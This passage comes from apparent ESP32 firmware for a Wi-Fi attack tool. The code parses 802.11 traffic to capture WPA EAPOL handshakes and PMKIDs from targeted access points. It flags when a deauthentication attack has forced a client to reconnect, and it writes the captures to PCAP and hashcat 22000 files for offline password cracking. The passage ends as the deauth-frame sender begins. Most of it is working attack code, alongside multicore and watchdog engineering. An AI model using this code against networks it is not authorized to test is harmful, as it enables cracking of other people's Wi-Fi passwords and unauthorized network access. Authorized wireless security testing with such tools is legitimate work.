                    pendingNetworkChannel = networks()[idx].channel;
                    pendingNewNetwork = true;
                }
                break;
            }
            
            offset += 2 + ieLen;
        }
    }
    
    networks()[idx].lastSeen = millis();
    NetworkRecon::exitCritical();
}

void OinkMode::processDataFrame(const uint8_t* payload, uint16_t len, int8_t rssi) {
    if (len < 28) return;
    
    // Extract addresses based on ToDS/FromDS flags
    uint8_t toDs = (payload[1] & 0x01);
    uint8_t fromDs = (payload[1] & 0x02) >> 1;
    
    const uint8_t* bssid = nullptr;
    const uint8_t* clientMac = nullptr;
    
    // Address layout depends on ToDS/FromDS:
    // ToDS=0, FromDS=1: Addr1=DA(client), Addr2=BSSID, Addr3=SA
    // ToDS=1, FromDS=0: Addr1=BSSID, Addr2=SA(client), Addr3=DA
    if (!toDs && fromDs) {
        // From AP to client
        bssid = payload + 10;      // Addr2
        clientMac = payload + 4;   // Addr1 (destination = client)
    } else if (toDs && !fromDs) {
        // From client to AP
        bssid = payload + 4;       // Addr1
        clientMac = payload + 10;  // Addr2 (source = client)
    }
    
    // Track client if we identified both
    if (bssid && clientMac) {
        // Don't track broadcast/multicast
        if ((clientMac[0] & 0x01) == 0) {
            trackTargetClient(bssid, clientMac, rssi);
        }
    }
    
    // Check for EAPOL (LLC/SNAP header: AA AA 03 00 00 00 88 8E)
    // Data starts after 802.11 header (24 bytes for data frames)
    // May have QoS (2 bytes) and/or HTC (4 bytes)
    
    uint16_t offset = 24;
    
    // Adjust offset for address 4 if needed
    if (toDs && fromDs) offset += 6;
    
    // Check for QoS Data frame (subtype has bit 3 set = 0x08, 0x09, etc.)
    // Frame control byte 0: bits 4-7 = subtype, bit 3 of subtype = QoS
    uint8_t subtype = (payload[0] >> 4) & 0x0F;
    bool isQoS = (subtype & 0x08) != 0;
    if (isQoS) {
        offset += 2;  // QoS control field
    }
    
    // Check for HTC field (High Throughput Control, +HTC/Order bit)
    // Only present in QoS data frames when Order bit (bit 7 of FC byte 1) is set
    if (isQoS && (payload[1] & 0x80)) {
        offset += 4;  // HTC field
    }
    
    if (offset + 8 > len) return;
    
    // Check LLC/SNAP header for EAPOL
    if (payload[offset] == 0xAA && payload[offset+1] == 0xAA &&
        payload[offset+2] == 0x03 && payload[offset+3] == 0x00 &&
        payload[offset+4] == 0x00 && payload[offset+5] == 0x00 &&
        payload[offset+6] == 0x88 && payload[offset+7] == 0x8E) {
        
        eapolRxCount++;
        const uint8_t* srcMac = payload + 10;  // TA
        const uint8_t* dstMac = payload + 4;   // RA
        
        processEAPOL(payload + offset + 8, len - offset - 8, srcMac, dstMac, payload, len, rssi);
    }
}

void OinkMode::processEAPOL(const uint8_t* payload, uint16_t len, 
                             const uint8_t* srcMac, const uint8_t* dstMac,
                             const uint8_t* fullFrame, uint16_t fullFrameLen, int8_t rssi) {
    // =========================================================================
    // CORE 0 SAFETY RULES — DO NOT VIOLATE:
    //   1. NEVER call NetworkRecon::enterCritical() (= taskENTER_CRITICAL(&vectorMux))
    //      Core 1 holds vectorMux during update(). If Core 0 tries to acquire it
    //      while Core 1 holds it, Core 0 spins with interrupts OFF → TG1WDT_SYS_RST.
    //   2. NEVER iterate handshakes[] or pmkids[] — Core 1 may push_back() concurrently.
    //   3. ONLY use oinkQueueMux, and ONLY for short memcpy operations.
    //      Core 1 must NOT hold oinkQueueMux for long (it releases immediately after copy).
    // =========================================================================
    
    if (len < 4) return;
    
    // EAPOL: version(1) + type(1) + length(2) + descriptor(...)
    uint8_t type = payload[1];
    
    if (type != 3) { eapolRxNoKey++; return; }
    
    if (len < 99) { eapolRxNoKey++; return; }
    
    // Key info at offset 5-6
    uint16_t keyInfo = (payload[5] << 8) | payload[6];
    uint8_t install = (keyInfo >> 6) & 0x01;
    uint8_t keyAck = (keyInfo >> 7) & 0x01;
    uint8_t keyMic = (keyInfo >> 8) & 0x01;
    uint8_t secure = (keyInfo >> 9) & 0x01;
    
    uint8_t messageNum = 0;
    if (keyAck && !keyMic && !install && !secure) messageNum = 1;
    else if (!keyAck && keyMic && !install && !secure) messageNum = 2;
    else if (keyAck && keyMic && install && !secure) messageNum = 3;
    else if (!keyAck && keyMic && !install && secure) messageNum = 4;
    else if (keyAck && keyMic && !install && secure) messageNum = 4;  // PMF M4
    
    if (messageNum == 0) { eapolRxNoKey++; return; }
    
    // Determine which is AP (sender of M1/M3) and station
    uint8_t bssid[6], station[6];
    if (messageNum == 1 || messageNum == 3) {
        memcpy(bssid, srcMac, 6);
        memcpy(station, dstMac, 6);
    } else {
        memcpy(bssid, dstMac, 6);
        memcpy(station, srcMac, 6);
    }
    
    // M1 = AP initiating handshake = client reconnected after deauth!
    if (messageNum == 1 && deauthing && targetBssid[0] != 0) {
        if (memcmp(bssid, targetBssid, 6) == 0) {
            if (!pendingDeauthSuccess) {
                memcpy(pendingDeauthStation, station, 6);
                pendingDeauthSuccess = true;
            }
        } else {
            eapolRxNotTarget++;
        }
    }
    
    // ========== PURE ENQUEUER: Core 0 NEVER touches handshakes[] or pmkids[] ==========
    // Extract PMKID from M1 payload (packet parsing only, no vector access)
    bool hasPMKID = false;
    uint8_t pmkidBuf[16] = {0};
    uint8_t descriptorType = payload[4];
    if (messageNum == 1 && descriptorType == 0x02 && len >= 121) {
        uint16_t keyDataLen = (payload[97] << 8) | payload[98];
        if (keyDataLen >= 22 && len >= 99 + keyDataLen) {
            const uint8_t* keyData = payload + 99;
            for (uint16_t i = 0; i + 22 < keyDataLen; i++) {
                if (keyData[i] == 0xdd && keyData[i+1] == 0x14 &&
                    keyData[i+2] == 0x00 && keyData[i+3] == 0x0f &&
                    keyData[i+4] == 0xac && keyData[i+5] == 0x04) {
                    if (i + 22 > keyDataLen) break;
                    const uint8_t* pmkidData = keyData + i + 6;
                    bool allZeros = true;
                    for (int z = 0; z < 16; z++) {
                        if (pmkidData[z] != 0) { allZeros = false; break; }
                    }
                    if (allZeros) break;
                    memcpy(pmkidBuf, pmkidData, 16);
                    hasPMKID = true;
                    break;
                }
            }
        }
    }
    
    // Enqueue single EAPOL frame to deferred queue — Core 1 processes everything
    {
        taskENTER_CRITICAL(&oinkQueueMux);
        if (pendingHsAllocated[pendingHsWrite]) {
            taskEXIT_CRITICAL(&oinkQueueMux);
            return;  // Pool full — drop frame (rare with 4 slots)
        }
        PendingEAPOLFrame& slot = pendingHsPool[pendingHsWrite];
        memcpy(slot.bssid, bssid, 6);
        memcpy(slot.station, station, 6);
        slot.messageNum = messageNum;
        
        // Copy EAPOL payload
        uint16_t copyLen = min((uint16_t)512, len);
        memcpy(slot.frame.data, payload, copyLen);
        slot.frame.len = copyLen;
        slot.frame.messageNum = messageNum;
        slot.frame.timestamp = millis();
        slot.frame.rssi = rssi;
        
        // Copy full 802.11 frame for PCAP
        uint16_t fullCopyLen = min((uint16_t)300, fullFrameLen);
        memcpy(slot.frame.fullFrame, fullFrame, fullCopyLen);
        slot.frame.fullFrameLen = fullCopyLen;
        
        // Store PMKID if extracted from M1
        memcpy(slot.pmkid, pmkidBuf, 16);
        slot.hasPMKID = hasPMKID;
        
        pendingHsAllocated[pendingHsWrite] = true;
        pendingHsWrite = (pendingHsWrite + 1) % PENDING_HS_SLOTS;
        taskEXIT_CRITICAL(&oinkQueueMux);
    }
    
    // Queue mood/save events (volatile flag write — no vector access)
    if (hasPMKID) {
        if (!pendingPMKIDCapture) {
            pendingPMKIDSSID[0] = 0;  // Core 1 dequeue fills from networks
            pendingPMKIDCapture = true;
        }
        pendingAutoSave = true;
    }
}

// findOrCreateHandshake() and findOrCreatePMKID() REMOVED — callback is now a
// PURE ENQUEUER (no vector access). Core 1 dequeue uses findOrCreateHandshakeSafe().

// Safe versions for main thread use (Core 1 only — no spinlock needed since callback
// never touches handshakes[]/pmkids[] vectors)
int OinkMode::findOrCreateHandshakeSafe(const uint8_t* bssid, const uint8_t* station) {
    // Core 1 only — callback never touches handshakes[], no spinlock needed
    // Look for existing
    for (int i = 0; i < (int)handshakes.size(); i++) {
        if (memcmp(handshakes[i].bssid, bssid, 6) == 0 &&
            memcmp(handshakes[i].station, station, 6) == 0) {
            return i;
        }
    }
    
    // Limit check
    if (handshakes.size() >= MAX_HANDSHAKES) return -1;
    // Pressure gate: block new handshakes at Warning+ (aggressive shedding)
    if (HeapHealth::getPressureLevel() >= HeapPressureLevel::Warning) return -1;
    if (ESP.getFreeHeap() < HeapPolicy::kMinHeapForHandshakeAdd) return -1;
    if (handshakes.size() >= handshakes.capacity()) {
        if (ESP.getFreeHeap() < HeapPolicy::kMinHeapForHandshakeAdd) return -1;
    }
    
    // Create new entry
    CapturedHandshake hs = {0};
    memcpy(hs.bssid, bssid, 6);
    memcpy(hs.station, station, 6);
    hs.capturedMask = 0;
    hs.firstSeen = millis();
    hs.lastSeen = millis();
    hs.saved = false;
    hs.saveAttempts = 0;  // Start with no attempts
    hs.beaconData = nullptr;
    hs.beaconLen = 0;
    
    // Attach beacon if available
    if (beaconCaptured && beaconFrame && beaconFrameLen > 0 && beaconFrameLen <= MAX_BEACON_SIZE) {
        const uint8_t* beaconBssid = beaconFrame + 16;
        if (memcmp(beaconBssid, bssid, 6) == 0) {
            hs.beaconData = (uint8_t*)malloc(beaconFrameLen);
            if (hs.beaconData) {
                memcpy(hs.beaconData, beaconFrame, beaconFrameLen);
                hs.beaconLen = beaconFrameLen;
            }
        }
    }
    
    try {
        handshakes.push_back(hs);
    } catch (const std::bad_alloc&) {
        if (hs.beaconData) {
            free(hs.beaconData);
            hs.beaconData = nullptr;
        }
        SDLog::log("OINK", "Failed to create handshake: out of memory");
        return -1;
    }
    int idx = handshakes.size() - 1;
    return idx;
}

int OinkMode::findOrCreatePMKIDSafe(const uint8_t* bssid, const uint8_t* station) {
    // Core 1 only — callback never touches pmkids[], no spinlock needed
    // Look for existing
    for (int i = 0; i < (int)pmkids.size(); i++) {
        if (memcmp(pmkids[i].bssid, bssid, 6) == 0 &&
            memcmp(pmkids[i].station, station, 6) == 0) {
            return i;
        }
    }
    
    // Limit check
    if (pmkids.size() >= MAX_PMKIDS) return -1;
    // Pressure gate: block new PMKIDs at Warning+ (aggressive shedding)
    if (HeapHealth::getPressureLevel() >= HeapPressureLevel::Warning) return -1;
    if (pmkids.size() >= pmkids.capacity()) {
        if (ESP.getFreeHeap() < HeapPolicy::kMinHeapForOinkNetworkAdd) return -1;
    }
    
    // Create new entry
    CapturedPMKID p = {0};
    memcpy(p.bssid, bssid, 6);
    memcpy(p.station, station, 6);
    p.timestamp = millis();
    p.saved = false;
    p.saveAttempts = 0;
    
    try {
        pmkids.push_back(p);
    } catch (const std::bad_alloc&) {
        SDLog::log("OINK", "Failed to create PMKID: out of memory");
        return -1;
    }
    int idx = pmkids.size() - 1;
    return idx;
}

uint16_t OinkMode::getCompleteHandshakeCount() {
    uint16_t count = 0;
    for (const auto& hs : handshakes) {
        if (hs.isComplete()) count++;
    }
    return count;
}

// LOCKING state queries for display
bool OinkMode::isLocking() {
    return running && autoState == AutoState::LOCKING;
}

const char* OinkMode::getTargetSSID() {
    return targetCacheValid ? targetSSIDCache : "";
}

uint8_t OinkMode::getTargetClientCount() {
    return targetCacheValid ? targetClientCountCache : 0;
}

const uint8_t* OinkMode::getTargetBSSID() {
    return targetCacheValid ? targetBssidCache : nullptr;
}

bool OinkMode::isTargetHidden() {
    return targetCacheValid ? targetHiddenCache : false;
}

// Autosave worker task body. Runs on Core 0 at priority 0 (below
// the WiFi task which is priority 1). Waits on a notification
// from the loop, then calls autoSaveCheck() to do the SD I/O.
// The loop task never blocks on SD I/O — it only sends a
// notification. This fixes TG1WDT by letting Core 1's IDLE
// task run during the SD work (the actual starved task).
static void autosaveTask(void* /*arg*/) {
    for (;;) {
        // Block until the loop sets pendingAutoSave.
        ulTaskNotifyTake(pdTRUE, portMAX_DELAY);
        // Hand off to the existing autoSaveCheck body. It already
        // uses vTaskDelay(1) between SD writes to let Core 1 IDLE
        // run while we do the cluster allocation / file writes.
        OinkMode::autoSaveCheck();
    }
}

void OinkMode::autoSaveCheck() {
    if (!Config::isSDAvailable()) {
        return;
    }

    // Reset the task watchdog for the calling task (loop task) at the start.
    // The loop task is auto-subscribed to TWDT on ESP-IDF Arduino (confirmed
    // by src/core/sd_format.cpp:306,357,366 which already calls
    // esp_task_wdt_reset() from the loop task). This guarantees the watchdog
    // is fed before any potentially-long SD I/O begins, even if the
    // IDLE task's reset hook is starved while we hold oinkBusy.
    esp_task_wdt_reset();

    // Check if there's anything to save before pausing promiscuous
    bool hasUnsavedHS = false;
    bool hasUnsavedPMKID = false;

    for (const auto& hs : handshakes) {
        if (hs.isComplete() && !hs.saved && hs.saveAttempts < 3) {
            hasUnsavedHS = true;
            break;
        }
    }
    for (const auto& p : pmkids) {
        if (!p.saved && p.ssid[0] != 0) {
            hasUnsavedPMKID = true;
            break;
        }
    }

    if (!hasUnsavedHS && !hasUnsavedPMKID) {
        return;  // Nothing to save, skip promiscuous pause
    }

    const uint32_t autosaveStart = (uint32_t)esp_timer_get_time();
    Serial.printf("[OINK] autosave enter hs_unsaved=%u pmkid_unsaved=%u t=%u\r\n",
                  (unsigned)handshakes.size(),
                  (unsigned)pmkids.size(),
                  (unsigned)millis());

    // NOTE: No need to pause promiscuous mode for SD writes.
    // Promiscuous uses WiFi radio, SD uses SPI — completely separate hardware.
    // The oinkBusy flag in the callback already prevents concurrent access to handshakes.
    // Previously pausing here caused 100% TG1WDT crash on resume (WiFi driver state corruption).

    // Save any unsaved complete handshakes
    for (auto& hs : handshakes) {
        if (hs.isComplete() && !hs.saved && hs.saveAttempts < 3) {
            // Check backoff timer (exponential: 0s, 2s, 5s, then give up)
            static const uint32_t backoffMs[] = {0, 2000, 5000};
            uint32_t timeSinceCapture = millis() - hs.lastSeen;
            if (timeSinceCapture < backoffMs[hs.saveAttempts]) {
                continue;  // Wait for backoff period
            }

            const char* handshakesDir = SDLayout::handshakesDir();

            // Generate filename: SSID_BSSID.pcap
            char filename[64];
            SDLayout::buildCaptureFilename(filename, sizeof(filename),
                                           handshakesDir, hs.ssid, hs.bssid, ".pcap");

            // Ensure directory exists
            if (!SD.exists(handshakesDir)) {
                if (!SD.mkdir(handshakesDir)) {
                    SDLog::log("OINK", "Failed to create handshakes directory");
                    continue;  // Skip this handshake if we can't create directory
                }
            }

            const uint32_t hsStart = (uint32_t)esp_timer_get_time();

            // Save PCAP (for wireshark/manual analysis)
            bool pcapOk = saveHandshakePCAP(hs, filename);
            const uint32_t pcapDt = (uint32_t)esp_timer_get_time() - hsStart;
            yield();  // Feed watchdog between PCAP and 22000 writes — both are blocking SD I/O

            // Save 22000 format (hashcat-ready, no conversion needed)
            char filename22000[64];
            SDLayout::buildCaptureFilename(filename22000, sizeof(filename22000),
                                           handshakesDir, hs.ssid, hs.bssid, "_hs.22000");
            const uint32_t h22Start = (uint32_t)esp_timer_get_time();
            bool hs22kOk = saveHandshake22000(hs, filename22000);
            const uint32_t h22Dt = (uint32_t)esp_timer_get_time() - h22Start;
            yield();  // Feed watchdog after 22000 write

            Serial.printf("[OINK] save hs '%s' pcap=%s dt=%uus 22000=%s dt=%uus total=%uus\r\n",
                          hs.ssid,
                          pcapOk ? "OK" : "FAIL", (unsigned)pcapDt,
                          hs22kOk ? "OK" : "FAIL", (unsigned)h22Dt,
                          (unsigned)((uint32_t)esp_timer_get_time() - hsStart));

            if (pcapOk || hs22kOk) {
                hs.saved = true;
                SDLog::log("OINK", "Handshake saved: %s (pcap:%s 22000:%s)",
                           hs.ssid, pcapOk ? "OK" : "FAIL", hs22kOk ? "OK" : "FAIL");
            } else {
                // Failed - increment attempt counter
                hs.saveAttempts++;
                if (hs.saveAttempts >= 3) {
                    // Give up after 3 attempts to prevent infinite retry
                    SDLog::log("OINK", "Save failed after 3 attempts: %s (kept in RAM)", hs.ssid);
                    hs.saved = true;  // Mark as done to stop retries (data still in RAM)
                }
            }

            // Yield to watchdog/scheduler after each save. vTaskDelay puts the
            // task in Blocked state so the IDLE task can run and reset the
            // task watchdog — delay() does not always let IDLE run.
            vTaskDelay(pdMS_TO_TICKS(1));
        }
    }

    // Also save any unsaved PMKIDs
    const uint32_t pmkidStart = (uint32_t)esp_timer_get_time();
    saveAllPMKIDs();
    const uint32_t pmkidDt = (uint32_t)esp_timer_get_time() - pmkidStart;
    Serial.printf("[OINK] save pmkid dt=%uus\r\n", (unsigned)pmkidDt);

    const uint32_t autosaveDt = (uint32_t)esp_timer_get_time() - autosaveStart;
    Serial.printf("[OINK] autosave exit dt=%uus t=%u\r\n",
                  (unsigned)autosaveDt, (unsigned)millis());
}

// PCAP file format structures
#pragma pack(push, 1)
struct PCAPHeader {
    uint32_t magic;
    uint16_t version_major;
    uint16_t version_minor;
    int32_t thiszone;
    uint32_t sigfigs;
    uint32_t snaplen;
    uint32_t linktype;
};

struct PCAPPacketHeader {
    uint32_t ts_sec;
    uint32_t ts_usec;
    uint32_t incl_len;
    uint32_t orig_len;
};
#pragma pack(pop)

void OinkMode::writePCAPHeader(fs::File& f) {
    PCAPHeader hdr = {
        .magic = 0xA1B2C3D4,      // PCAP magic
        .version_major = 2,
        .version_minor = 4,
        .thiszone = 0,
        .sigfigs = 0,
        .snaplen = 65535,
        .linktype = 127           // LINKTYPE_IEEE802_11_RADIOTAP (with radiotap header)
    };
    f.write((uint8_t*)&hdr, sizeof(hdr));
}

// Minimal radiotap header (8 bytes) - no optional fields
static const uint8_t RADIOTAP_HEADER[] = {
    0x00,       // Header revision
    0x00,       // Header pad
    0x08, 0x00, // Header length (8, little-endian)
    0x00, 0x00, 0x00, 0x00  // Present flags (no optional fields)
};

void OinkMode::writePCAPPacket(fs::File& f, const uint8_t* data, uint16_t len, uint32_t ts) {
    // Total packet length = radiotap header + 802.11 frame
    uint32_t totalLen = sizeof(RADIOTAP_HEADER) + len;

    PCAPPacketHeader pkt = {
        .ts_sec = ts / 1000,
        .ts_usec = (ts % 1000) * 1000,
        .incl_len = totalLen,
        .orig_len = totalLen
    };
    f.write((uint8_t*)&pkt, sizeof(pkt));
    yield();  // Feed watchdog between SD writes — full PCAP save is 15+ blocking writes

    // Write radiotap header
    f.write(RADIOTAP_HEADER, sizeof(RADIOTAP_HEADER));
    yield();

    // Write 802.11 frame data
    f.write(data, len);
}

bool OinkMode::saveHandshakePCAP(const CapturedHandshake& hs, const char* path) {
    File f = SD.open(path, FILE_WRITE);
    if (!f) {
        return false;
    }
    // SD.open is itself a blocking SPI transaction (FAT directory lookup +
    // cluster allocation). Yield to IDLE so the watchdog can be fed even
    // on the first PCAP write after the captures were deleted from SD.
    vTaskDelay(pdMS_TO_TICKS(1));

    writePCAPHeader(f);
    vTaskDelay(pdMS_TO_TICKS(1));

    int packetCount = 0;
    
    // Write beacon frame first (required for hashcat to crack)
    // Try per-handshake beacon first, fall back to global
    if (hs.hasBeacon()) {
        writePCAPPacket(f, hs.beaconData, hs.beaconLen, hs.firstSeen);
        packetCount++;
    } else if (beaconCaptured && beaconFrame && beaconFrameLen > 0) {
        // Verify global beacon is from same BSSID as handshake
        const uint8_t* beaconBssid = beaconFrame + 16;
        if (memcmp(beaconBssid, hs.bssid, 6) == 0) {
            writePCAPPacket(f, beaconFrame, beaconFrameLen, hs.firstSeen);
            packetCount++;
        }
    }
    
    // Write EAPOL frames to PCAP
    for (int i = 0; i < 4; i++) {
        if (!(hs.capturedMask & (1 << i))) continue;
        
        const EAPOLFrame& frame = hs.frames[i];
        if (frame.len == 0) continue;
        
        // Prefer stored fullFrame (real 802.11 capture) over reconstruction
        if (frame.fullFrameLen > 0 && frame.fullFrameLen <= 300) {
            // Use the actual captured 802.11 frame (best quality)
            writePCAPPacket(f, frame.fullFrame, frame.fullFrameLen, frame.timestamp);
            packetCount++;
        } else {
            // Fallback: reconstruct frame from EAPOL payload (legacy path)
            uint8_t pkt[600];
            uint16_t pktLen = 0;
            
            // 802.11 Data frame header (24 bytes)
            pkt[0] = 0x08;
            pkt[2] = 0x00; pkt[3] = 0x00;  // Duration
            
            // Addresses depend on message direction
            if (i == 0 || i == 2) {  // M1, M3: AP->Station (FromDS=1, ToDS=0)
                pkt[1] = 0x02;
                memcpy(pkt + 4, hs.station, 6);
                memcpy(pkt + 10, hs.bssid, 6);
                memcpy(pkt + 16, hs.bssid, 6);
            } else {  // M2, M4: Station->AP (ToDS=1, FromDS=0)
                pkt[1] = 0x01;
                memcpy(pkt + 4, hs.bssid, 6);
                memcpy(pkt + 10, hs.station, 6);
                memcpy(pkt + 16, hs.bssid, 6);
            }
            
            pkt[22] = 0x00; pkt[23] = 0x00;  // Sequence
            pktLen = 24;
            
            // LLC/SNAP header (8 bytes)
            pkt[24] = 0xAA; pkt[25] = 0xAA; pkt[26] = 0x03;
            pkt[27] = 0x00; pkt[28] = 0x00; pkt[29] = 0x00;
            pkt[30] = 0x88; pkt[31] = 0x8E;
            pktLen = 32;
            
            // EAPOL data
            if (32 + frame.len > sizeof(pkt)) continue;
            memcpy(pkt + 32, frame.data, frame.len);
            pktLen += frame.len;
            
            writePCAPPacket(f, pkt, pktLen, frame.timestamp);
            packetCount++;
        }
    }
    
    f.close();
    return true;
}

bool OinkMode::saveAllHandshakes() {
    bool success = true;
    autoSaveCheck();  // This saves any unsaved ones
    return success;
}

bool OinkMode::savePMKID22000(const CapturedPMKID& p, const char* path) {
    // Save PMKID in hashcat 22000 format:
    // WPA*01*PMKID*MAC_AP*MAC_CLIENT*ESSID***MESSAGEPAIR
    
    // Safety check: don't save all-zero PMKIDs (invalid/empty)
    bool allZeros = true;
    for (int i = 0; i < 16; i++) {
        if (p.pmkid[i] != 0) { allZeros = false; break; }
    }
    if (allZeros) {
        return false;
    }
    
    File f = SD.open(path, FILE_WRITE);
    if (!f) {
        return false;
    }
    
    // Build the hash line
    // PMKID (16 bytes as 32 hex chars)
    char pmkidHex[33];
    for (int i = 0; i < 16; i++) {
        sprintf(pmkidHex + i*2, "%02x", p.pmkid[i]);
    }
    
    // MAC_AP (6 bytes as 12 hex chars, no colons)
    char macAP[13];
    sprintf(macAP, "%02x%02x%02x%02x%02x%02x",
            p.bssid[0], p.bssid[1], p.bssid[2], 
            p.bssid[3], p.bssid[4], p.bssid[5]);
    
    // MAC_CLIENT (6 bytes as 12 hex chars)
    char macClient[13];
    sprintf(macClient, "%02x%02x%02x%02x%02x%02x",
            p.station[0], p.station[1], p.station[2], 
            p.station[3], p.station[4], p.station[5]);
    
    // ESSID (hex-encoded, max 32 chars = 64 hex + null)
    char essidHex[65];
    int ssidLen = strlen(p.ssid);
    if (ssidLen > 32) ssidLen = 32;  // Cap to max SSID length
    for (int i = 0; i < ssidLen; i++) {
        sprintf(essidHex + i*2, "%02x", (uint8_t)p.ssid[i]);
    }
    essidHex[ssidLen * 2] = 0;
    
    // Write: WPA*01*PMKID*MAC_AP*MAC_CLIENT*ESSID***01
    // MESSAGEPAIR 01 = PMKID taken from AP
    f.printf("WPA*01*%s*%s*%s*%s***01\n", pmkidHex, macAP, macClient, essidHex);
    
    f.close();
    return true;
}

bool OinkMode::saveHandshake22000(const CapturedHandshake& hs, const char* path) {
    // Save handshake in hashcat 22000 format:
    // WPA*02*MIC*MAC_AP*MAC_CLIENT*ESSID*NONCE_AP*EAPOL_CLIENT*MESSAGEPAIR
    //
    // Supported message pairs:
    // - 0x00: M1+M2 (ANonce from M1, EAPOL+MIC from M2) - most common
    // - 0x02: M2+M3 (ANonce from M3, EAPOL+MIC from M2) - fallback
    
    uint8_t msgPair = hs.getMessagePair();
    if (msgPair == 0xFF) {
        return false;
    }
    
    // Determine which frames to use
    const EAPOLFrame* nonceFrame = nullptr;  // M1 or M3 (contains ANonce)
    const EAPOLFrame* eapolFrame = nullptr;  // M2 (contains MIC + full EAPOL)
    
    if (msgPair == 0x00) {
        // M1+M2: ANonce from M1, EAPOL from M2
        nonceFrame = &hs.frames[0];  // M1
        eapolFrame = &hs.frames[1];  // M2
    } else {
        // M2+M3: ANonce from M3, EAPOL from M2
        nonceFrame = &hs.frames[2];  // M3
        eapolFrame = &hs.frames[1];  // M2
    }
    
    // MIC field is at offset 81-96 (16 bytes), so we need len >= 97 to read it safely
    if (nonceFrame->len < 51 || eapolFrame->len < 97) {
        return false;
    }
    
    File f = SD.open(path, FILE_WRITE);
    if (!f) {
        return false;
    }
    // SD.open is a blocking SPI transaction. Yield to IDLE so the
    // watchdog is fed during the 22000 write's open phase.
    vTaskDelay(pdMS_TO_TICKS(1));

    // Extract MIC from M2 EAPOL frame (offset 81, 16 bytes)
    // EAPOL-Key: ver(1)+type(1)+len(2)+desc(1)+keyinfo(2)+keylen(2)+replay(8)+nonce(32)+iv(16)+rsc(8)+reserved(8)+MIC(16)
    // Offsets: 0-3=EAPOL hdr, 4=desc, 5-6=keyinfo, 7-8=keylen, 9-16=replay, 17-48=nonce, 49-64=iv, 65-72=rsc, 73-80=reserved, 81-96=MIC
    char micHex[33];
    for (int i = 0; i < 16; i++) {
        sprintf(micHex + i*2, "%02x", eapolFrame->data[81 + i]);
    }
    
    // MAC_AP (6 bytes as 12 hex chars)
    char macAP[13];
    sprintf(macAP, "%02x%02x%02x%02x%02x%02x",
            hs.bssid[0], hs.bssid[1], hs.bssid[2],
            hs.bssid[3], hs.bssid[4], hs.bssid[5]);
    
    // MAC_CLIENT (6 bytes as 12 hex chars)
    char macClient[13];
    sprintf(macClient, "%02x%02x%02x%02x%02x%02x",
            hs.station[0], hs.station[1], hs.station[2],
            hs.station[3], hs.station[4], hs.station[5]);
    
    // ESSID (hex-encoded, max 32 chars = 64 hex + null)
    char essidHex[65];
    int ssidLen = strlen(hs.ssid);
    if (ssidLen > 32) ssidLen = 32;  // Cap to max SSID length
    for (int i = 0; i < ssidLen; i++) {
        sprintf(essidHex + i*2, "%02x", (uint8_t)hs.ssid[i]);
    }
    essidHex[ssidLen * 2] = 0;
    
    // ANonce from M1 or M3 (offset 17, 32 bytes)
    char nonceHex[65];
    for (int i = 0; i < 32; i++) {
        sprintf(nonceHex + i*2, "%02x", nonceFrame->data[17 + i]);
    }
    
    // Full EAPOL frame from M2 (hex-encoded)
    // The EAPOL frame length is in bytes 2-3 (big-endian) + 4 bytes header
    uint16_t eapolLen = (eapolFrame->data[2] << 8) | eapolFrame->data[3];
    eapolLen += 4;  // Add EAPOL header (version + type + length)
    if (eapolLen > eapolFrame->len) eapolLen = eapolFrame->len;
    
    // Allocate buffer for hex-encoded EAPOL (2 chars per byte)
    // Max EAPOL is 512 bytes = 1024 hex chars + null
    static char eapolHex[1025];
    if (eapolLen * 2 + 1 > sizeof(eapolHex)) {
        f.close();
        return false;
    }
    
    // Zero the MIC in EAPOL copy for hashcat (MIC at offset 81)
    // Work on a copy to avoid modifying original
    uint8_t eapolCopy[512];
    memcpy(eapolCopy, eapolFrame->data, eapolLen);
    memset(eapolCopy + 81, 0, 16);  // Zero MIC field
    
    for (int i = 0; i < eapolLen; i++) {
        sprintf(eapolHex + i*2, "%02x", eapolCopy[i]);
    }
    eapolHex[eapolLen * 2] = 0;
    
    // Write: WPA*02*MIC*MAC_AP*MAC_CLIENT*ESSID*ANONCE*EAPOL*MESSAGEPAIR
    f.printf("WPA*02*%s*%s*%s*%s*%s*%s*%02x\n",
             micHex, macAP, macClient, essidHex, nonceHex, eapolHex, msgPair);
    
    f.close();
    
    return true;
}

bool OinkMode::saveAllPMKIDs() {
    if (!Config::isSDAvailable()) return false;

    // Reset TWDT before PMKID saves — same reasoning as in autoSaveCheck().
    esp_task_wdt_reset();

    const char* handshakesDir = SDLayout::handshakesDir();

    // Ensure directory exists
    if (!SD.exists(handshakesDir)) {
        if (!SD.mkdir(handshakesDir)) {
            SDLog::log("OINK", "Failed to create handshakes directory for PMKID");
            return false;
        }
    }
    
    bool success = true;
    for (auto& p : pmkids) {
        // SSID backfill: In passive mode (DO NO HAM), M1 frames may arrive before
        // beacon, so SSID lookup fails at capture time. Try again before saving.
        // SSID is REQUIRED for PMKID cracking - it's the salt for PBKDF2(passphrase, SSID).
        if (p.ssid[0] == 0) {
            for (const auto& net : networks()) {
                if (memcmp(net.bssid, p.bssid, 6) == 0 && net.ssid[0] != 0) {
                    strncpy(p.ssid, net.ssid, 32);
                    p.ssid[32] = 0;
                    break;
                }
            }
        }
        
        // SSID is required - PMK = PBKDF2(passphrase, SSID), so no SSID = uncrackable
        // Keep in memory for later retry if SSID is found
        if (!p.saved && p.ssid[0] != 0 && p.saveAttempts < 3) {
            // Skip invalid all-zero PMKIDs (don't count as attempt)
            bool allZeros = true;
            for (int i = 0; i < 16; i++) {
                if (p.pmkid[i] != 0) { allZeros = false; break; }
            }
            if (allZeros) {
                p.saved = true;
                continue;
            }

            // Check backoff timer (exponential: 0s, 2s, 5s, then give up)
            static const uint32_t backoffMs[] = {0, 2000, 5000};
            uint32_t timeSinceCapture = millis() - p.timestamp;
            if (timeSinceCapture < backoffMs[p.saveAttempts]) {
                continue;  // Wait for backoff period
            }
            
            // Use SSID_BSSID filename in /handshakes/
            char filename[64];
            SDLayout::buildCaptureFilename(filename, sizeof(filename),
                                           handshakesDir, p.ssid, p.bssid, ".22000");
            
            if (savePMKID22000(p, filename)) {
                p.saved = true;
                SDLog::log("OINK", "PMKID saved: %s", p.ssid);
            } else {
                // Failed - increment attempt counter
                p.saveAttempts++;
                if (p.saveAttempts >= 3) {
                    // Give up after 3 attempts to prevent infinite retry
                    SDLog::log("OINK", "PMKID save failed after 3 attempts: %s (kept in RAM)", p.ssid);
                    p.saved = true;  // Mark as done to stop retries (data still in RAM)
                }
                success = false;
            }
            
            // Yield to watchdog/scheduler after each save
            delay(1);
        }
    }
    return success;
}

void OinkMode::sendDeauthFrame(const uint8_t* bssid, const uint8_t* station, uint8_t reason) {
